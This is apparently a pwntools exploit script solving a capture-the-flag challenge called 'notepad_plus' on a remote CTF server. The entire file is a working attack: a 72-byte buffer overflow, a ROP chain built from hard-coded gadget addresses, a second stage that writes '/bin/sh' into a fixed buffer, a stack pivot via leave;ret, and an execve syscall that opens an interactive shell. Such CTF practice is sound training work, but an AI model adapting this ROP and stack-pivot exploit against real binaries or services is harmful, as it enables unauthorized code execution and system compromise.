#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = remote('ctf.adl.tw',11004)
#r = process('./notepad_plus')

padding = 'a'*(72)

# rdx = size , rsi = buf , rdi = 0 , rax = 0

buf = 0x006b6500
pop_rax_ret = 0x000000000044cccc
pop_rdx_ret = 0x000000000044cd25 
pop_rsi_ret = 0x00000000004124d3
pop_rdi_ret = 0x0000000000400686 
xor_edi_edi_syscall = 0x000000000044d88c
leave_ret = 0x0000000000400c46
syscall = 0x000000000047b6af
main = 0x400c9c

rop = flat(
    pop_rsi_ret , buf , xor_edi_edi_syscall , main
)

payload = '/bin/sh\x00'+ p64(pop_rax_ret)
payload += p64(0x3b)
payload += p64(pop_rdx_ret)
payload += p64(0x0)
payload += p64(pop_rsi_ret)
payload += p64(0x0)
payload += p64(pop_rdi_ret)
payload += p64(0x006b6500)
payload += p64(syscall)

r.sendline(padding + rop)
raw_input('#')
r.sendline(payload)

rop2 = flat(
    buf , leave_ret 
)
raw_input('#')
r.sendline('a'*(72-8) + rop2)


r.interactive()
